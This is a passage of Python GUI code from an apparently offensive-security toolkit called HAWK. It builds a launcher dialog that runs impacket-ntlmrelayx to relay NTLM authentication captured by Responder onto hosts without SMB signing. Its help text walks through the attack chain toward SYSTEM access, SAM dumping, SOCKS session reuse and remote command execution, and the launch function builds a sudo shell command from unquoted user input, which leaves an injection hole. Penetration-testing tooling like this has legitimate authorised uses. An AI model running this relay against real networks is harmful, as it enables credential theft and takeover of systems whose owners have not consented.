             self._show_ntlmrelayx_launcher(tool, state),
             primary=True, w=160)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)

    def _show_ntlmrelayx_launcher(self, tool, state):
        """Quick dialog to fire impacket-ntlmrelayx in an xterm.

        Relay is the classic Responder sidekick: Responder poisons
        the name resolution, the victim NTLM-auths against us, and
        ntlmrelayx forwards the auth live to a target where SMB
        signing is disabled (→ SYSTEM shell, or -socks for socksy
        access to the relayed session).
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        win = _make_win(self, "ntlmrelayx — live relay", 680, 520)
        _title(win, "ntlmrelayx — live relay launcher")
        _sub(win, "Relay a fresh NTLM auth captured by Responder "
                  "onto a target where SMB signing is off.",
             COLORS["text_dim"])

        _note_box(
            win,
            "How it works:\n"
            "  · Victim's browser/Explorer looks up a fake name\n"
            "  · Responder answers → victim NTLM-auths to us\n"
            "  · ntlmrelayx forwards the auth LIVE to <target>\n"
            "  · If SMB signing is not enforced → SYSTEM on target\n\n"
            "IMPORTANT: disable Responder's SMB server first (-P no "
            "in Responder.conf) or ntlmrelayx can't take over 445.\n"
            "Alternatively, stop Responder and run ntlmrelayx alone "
            "— it does its own poisoning via mitm6 / adv.",
            COLORS["border_amber"])

        tgt_var = ctk.StringVar(
            value=self._get_target() or "192.168.1.10")
        mode_var = ctk.StringVar(value="-smb2support")
        extra_var = ctk.StringVar(value="")

        def _row(label, var, hint=""):
            fr = ctk.CTkFrame(win, fg_color="transparent")
            fr.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(
                fr, text=label, width=110, anchor="w",
                font=_f("sm", True),
                text_color=COLORS["text_bright"],
            ).pack(side="left")
            e = ctk.CTkEntry(
                fr, textvariable=var, font=_f("md"), height=30,
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_green"],
                border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if hint:
                ctk.CTkLabel(
                    win, text=hint, font=_f("xs"),
                    text_color=COLORS["text_dim"],
                    anchor="w", wraplength=600,
                ).pack(fill="x", padx=24, pady=(0, 2))

        _row("Relay target", tgt_var,
             "IP or hostname.  Must have SMB signing DISABLED "
             "(nxc smb <ip> --gen-relay-list check).")

        mode_frame = ctk.CTkFrame(win, fg_color="transparent")
        mode_frame.pack(fill="x", padx=24, pady=(6, 2))
        ctk.CTkLabel(
            mode_frame, text="Mode:", font=_f("sm", True),
            text_color=COLORS["text_bright"], width=110, anchor="w",
        ).pack(side="left")
        for val, lbl in [
            ("-smb2support",
             "standard SMB relay (dump SAM if admin)"),
            ("-smb2support -socks",
             "SOCKS proxy (session pool for later use)"),
            ("-smb2support -c 'whoami'",
             "one-shot command execution"),
        ]:
            ctk.CTkRadioButton(
                mode_frame, text=lbl, variable=mode_var, value=val,
                font=_f("sm"), text_color=COLORS["text_dim"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
            ).pack(anchor="w", padx=6, pady=1)

        _row("Extra args", extra_var,
             "e.g. --escalate-user hawk, --delegate-access, -ts "
             "(timestamps)")

        def _launch():
            tgt = tgt_var.get().strip()
            if not tgt:
                return
            mode = mode_var.get().strip()
            extra = extra_var.get().strip()
            cmd = f"sudo impacket-ntlmrelayx -t {tgt} {mode}"
            if extra:
                cmd += f" {extra}"
            _safe_destroy(win)
            from utils.runner import _open_terminal
            script = (
                "echo ''; "
                "echo '╔═══════════════════════════════════════════════════════════╗'; "
                "echo '║  HAWK  —  ntlmrelayx  (live NTLM relay)                   ║'; "
                "echo '╚═══════════════════════════════════════════════════════════╝'; "
                "echo ''; "
                f"echo '$ {cmd}'; "
                "echo ''; "
                + cmd
                + "; echo ''; echo '[HAWK] ntlmrelayx stopped.'"
                  "; read -p 'Press ENTER to close...'"
            )
            _open_terminal("HAWK — ntlmrelayx", script)
            self.app.terminal.write(
                f"  [+] ntlmrelayx launched: {cmd}", "success")

        row = _btn_row(win)
        _btn(row, "LAUNCH", _launch, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

